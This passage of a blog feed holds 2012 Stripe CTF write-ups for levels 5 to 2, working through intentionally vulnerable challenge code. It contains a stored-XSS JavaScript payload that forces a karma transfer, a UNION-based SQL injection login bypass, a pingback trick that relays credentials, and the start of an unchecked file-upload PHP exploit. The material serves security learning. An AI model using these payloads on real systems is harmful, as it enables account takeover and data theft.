    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Server responded with: &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The server uses &lt;code&gt;params&lt;/code&gt; to recover the informations sent by
the form. Then it &lt;code&gt;POST&lt;/code&gt; s the username and the password to the
to the pingback URL. But &lt;code&gt;params&lt;/code&gt; is the Ruby equivalent of
&lt;code&gt;$_REQUEST&lt;/code&gt; in PHP, which recovers the informations sent by
&lt;code&gt;POST&lt;/code&gt;, but also by &lt;code&gt;GET&lt;/code&gt;. So let's say we put this as
a pingback URL:
&lt;code&gt;http://leve05-[numbers].stripe-ctf.com?pingback=http://level02-[numbers].stripe-ctf.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Okay, here is where it gets tricky: the server retrieves the previous
URL as a pingback. It then posts our username/password to it, i.e. to
itself, since the address is
&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. So the server finds itself
with a username/password by &lt;code&gt;POST&lt;/code&gt;, and a pingback (the level
#2 URL) by &lt;code&gt;GET&lt;/code&gt;. So it does its business: sends the
username/password to the pingback.&lt;/p&gt;
&lt;p&gt;First we fill in the login:&lt;/p&gt;
&lt;img alt="level05-second-form.png" class="align-center" src="/images/stripe-ctf-level-5/level05-second-form.png" /&gt;
&lt;p&gt;Then we submit:&lt;/p&gt;
&lt;img alt="level05-second-login.png" class="align-center" src="/images/stripe-ctf-level-5/level05-second-login.png" /&gt;
&lt;p&gt;We clearly see here that the server was interrogated twice.&lt;/p&gt;
&lt;p&gt;And we just have to go back to the login page:&lt;/p&gt;
&lt;img alt="level05-w00t.png" class="align-center" src="/images/stripe-ctf-level-5/level05-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #4</title><link href="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-4/" rel="alternate"></link><updated>2012-10-27T14:22:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:posts/2012/10/27/stripe-ctf-level-4/</id><summary type="html">&lt;img alt="level04-logo.jpg" class="align-center" src="/images/stripe-ctf-level-4/level04-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-4/stripe-ctf-level04.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants you to spread joy over the world. You have a certain
amount of karma you can distribute to people. But to be sure that you
only send karma to people you really trust to be good, everyone you send
karma to will be able to see your password. What's more, the user
karma_fountain is soooo good that he has infinite karma. Wouldn't it be
nice if you could get access to his account?&lt;/p&gt;
&lt;p&gt;Here, we can see that the user captain sent us one karma. Now, his
password, ''captain_password'', is visible to us.&lt;/p&gt;
&lt;img alt="level04-transfer_captain_cats.png" class="align-center" src="/images/stripe-ctf-level-4/level04-transfer_captain_cats.png" /&gt;
&lt;p&gt;So, all we have to do to get karma_fountain's password is to get him to
send us karma. Two ways for this: we could be so good that he'll want to
give us karma, or we can force him a little bit.&lt;/p&gt;
&lt;p&gt;So, what are our ways to interact with karma_fountain? The site doesn't
offer some kind of internal messaging, we don't have an email address...
All we can do is send karma_fountain some karma. Then, he'll see our
password on his profile page. Hmmm, our password will be written to its
profile page:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File views/home.erb, line 52&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% @registered_users.each &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;&amp;lt;% last_active = user[:last_active].strftime(&amp;#39;%H:%M:%S UTC&amp;#39;) %&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% if &lt;/span&gt;&lt;span class="vi"&gt;@trusts_me&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;%= user[:username] %&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;(password: &amp;lt;%=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;, last active &amp;lt;%= last_active %&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/li&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The password is not sanitized before it is displayed. Is it before it's
registered in the database?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c1"&gt;# File srv.rb, line 168&lt;/span&gt;
&lt;span class="no"&gt;DB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:users&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:karma&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;STARTING_KARMA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:last_active&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utc&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nope. So if we put some javascript code as our password, and then we
send karma to karma_fountain, our password (i.e. the javascript code)
will be embedded in karma_fountain's page. If this javascript tells
karma_fountain's browser to send us karma, its password will be
displayed on our home page.&lt;/p&gt;
&lt;p&gt;So, let's create a user evil_hacker, with the following password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;form&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;action&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;transfer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;to_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cats&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;amount_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Okay, I know this code is way too long, but javascript is really not my
strong suit. Plus, there is the problem that once karma_fountain's
browser executes the javascript, the transfer will take place, then
karma_fountain will be redirected to its homepage, where the transfer
will take place etc. Not very sly. So, there is room for improvement on
this code. It's just to demonstrate the attack.&lt;/p&gt;
&lt;img alt="level04-evil_hacker_register.png" class="align-center" src="/images/stripe-ctf-level-4/level04-evil_hacker_register.png" /&gt;
&lt;p&gt;We connect as evil_hacker and send one karma to karma_fountain. Then,
we wait for him to connect (the CTF staff had put up a bot which would
look at its profile page every five minutes). Let's look at our profile:&lt;/p&gt;
&lt;img alt="level04-w00t.png" class="align-center" src="/images/stripe-ctf-level-4/level04-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #3</title><link href="https://allyourbase.utouch.fr/posts/2012/10/26/stripe-ctf-level-3/" rel="alternate"></link><updated>2012-10-26T23:34:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-26:posts/2012/10/26/stripe-ctf-level-3/</id><summary type="html">&lt;img alt="level03-logo.png" class="align-center" src="/images/stripe-ctf-level-3/level03-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-3/level03-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;8710c082daed1839806addebeda44c6e5496d44a33f7eb3f23a577b6a5fc26d5&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;The company who built the vault of level 0 learned its lesson: you now
have to identify before accessing your guarded secrets.&lt;/p&gt;
&lt;p&gt;The company kindly tells you that other users have already chosen to
use their product, and even what the stored secrets are.&lt;/p&gt;
&lt;img alt="level03-index.png" class="align-center" src="/images/stripe-ctf-level-3/level03-index.png" /&gt;
&lt;p&gt;Sorry for math and physics fan, but we'll focus on bob's secret.&lt;/p&gt;
&lt;p&gt;So, let's look at the code used to identify users:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File secretvault.py, line 74&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Must provide username&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Must provide password&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data_dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;users.db&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&amp;quot;SELECT id, password_hash, salt FROM users&lt;/span&gt;
&lt;span class="s"&gt;            WHERE username = &amp;#39;{0}&amp;#39; LIMIT 1&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;res&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cursor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fetchone&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;There&amp;#39;s no such user {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;res&lt;/span&gt;

    &lt;span class="n"&gt;calculated_hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha256&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;calculated_hash&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;That&amp;#39;s not the password for {0}!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;user_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_id&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;absolute_url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wow. Hashed passwords, and even salt! Seems pretty secure. But the
statements aren't prepared: they are vulnerable to SQL injection. We are
gonna use a &lt;code&gt;UNION&lt;/code&gt; statement, to force the id, the password's
hash and the salt to be arbitrary values. We can see from the
&lt;code&gt;generate_data.py&lt;/code&gt; file that the default users were added in a
random order, so we don't know what bob's id is. Since there are only
three values, we can try each by hand. For the sake of simplicity, we'll
suppose here that bob's id is 1.&lt;/p&gt;
&lt;p&gt;So, let's say we put this as a user in the form:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dummy-user' UNION SELECT 1, 'hash', 'salt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The statement will become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;dummy-user&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;UNION&lt;/span&gt; &lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hash&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;salt&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;LIMIT&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This way, the first part of the statement will yield an empty row, and
the second part will yield 1, 'hash', 'salt'. If we want to connect with
the password 'foo', with the salt 'bar', we can compute the password's
hash:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sha256('foobar') =
c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We fill the form this way:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user = dummy-user' UNION SELECT 1,
'c3ab8ff13720e8ad9047dd39466b3c8974e592c2fa383d4a3960714caef0c4f2',
'bar&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;and&lt;/p&gt;
&lt;p&gt;&lt;code&gt;password = foo&lt;/code&gt;&lt;/p&gt;
&lt;img alt="level03-filled-form.png" class="align-center" src="/images/stripe-ctf-level-3/level03-filled-form.png" /&gt;
&lt;p&gt;We just have to submit to retrieve bob's secret:&lt;/p&gt;
&lt;img alt="level03-w00t.png" class="align-center" src="/images/stripe-ctf-level-3/level03-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #2</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-2/" rel="alternate"></link><updated>2012-10-13T16:11:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/stripe-ctf-level-2/</id><summary type="html">&lt;img alt="level02-logo.png" class="align-center" src="/images/stripe-ctf-level-2/level02-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-2/level02-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;d175b624ed888badd795c5474ae855f711e856cc41c0757059594babe8f23413&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is a whole social network!&lt;/p&gt;
&lt;p&gt;Okay, it's not, it's just a page with a profile picture. But on the
bottom of the page, you can see something interesting: &amp;quot;Password for
Level 3 (accessible only to members of the club)&amp;quot;. Of course, if you
click on it it doesn't work. Let's see how we can access this file.&lt;/p&gt;
&lt;p&gt;The key here is that you can upload your picture so that it's displayed
on your profile page.&lt;/p&gt;
&lt;img alt="level02-uploaded-picture.png" class="align-center" src="/images/stripe-ctf-level-2/level02-uploaded-picture.png" /&gt;
&lt;p&gt;But if you look at the code, you can see that no check is performed on
the file you upload. Which means you can upload &lt;strong&gt;any&lt;/strong&gt; file, not just a
picture.&lt;/p&gt;
&lt;p&gt;You also know where your &amp;quot;picture&amp;quot; is stored: uploads/your_file. So we
can upload a PHP script that'll open the password file, and visit the
URL where it's located to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
